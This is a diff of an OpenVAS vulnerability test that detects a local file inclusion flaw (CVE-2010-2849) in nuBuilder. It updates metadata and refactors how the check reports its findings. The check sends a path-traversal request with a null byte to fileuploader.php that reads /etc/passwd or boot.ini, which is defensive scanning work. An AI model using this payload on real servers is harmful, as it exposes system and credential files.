@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_nuBuilder_41404.nasl 5323 2017-02-17 08:49:23Z teissa $
+# $Id: gb_nuBuilder_41404.nasl 5769 2017-03-29 13:50:21Z cfi $
 #
 # nuBuilder Local File Include and Cross Site Scripting Vulnerabilities
 #
@@ -40,16 +40,15 @@ based authentication credentials and launch other attacks.
 
 nuBuilder 10.04.20 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100704);
- script_version("$Revision: 5323 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-17 09:49:23 +0100 (Fri, 17 Feb 2017) $");
+ script_version("$Revision: 5769 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:50:21 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-07-07 12:47:04 +0200 (Wed, 07 Jul 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_cve_id("CVE-2010-2849");
+ script_cve_id("CVE-2010-2849");
  script_bugtraq_id(41404);
 
  script_name("nuBuilder Local File Include and Cross Site Scripting Vulnerabilities");
@@ -60,10 +59,10 @@ if (description)
  script_xref(name : "URL" , value : "http://www.nubuilder.com/nubuilderwww/");
 
  script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -72,30 +71,27 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
+include("host_details.inc");
+
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
-
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/nubuilder",cgi_dirs());
-files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
+files = traversal_files();
 
+foreach dir( make_list_unique( "/nubuilder", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
+
   foreach file (keys(files)) {
-   
-    url = string(dir,"/productionnu2/fileuploader.php?dir=../../../../../../../../../../../",files[file],"%00"); 
+
+    url = string(dir,"/productionnu2/fileuploader.php?dir=../../../../../../../../../../../",files[file],"%00");
 
     if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
-
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
-  
-exit(0);
+
+exit( 99 );
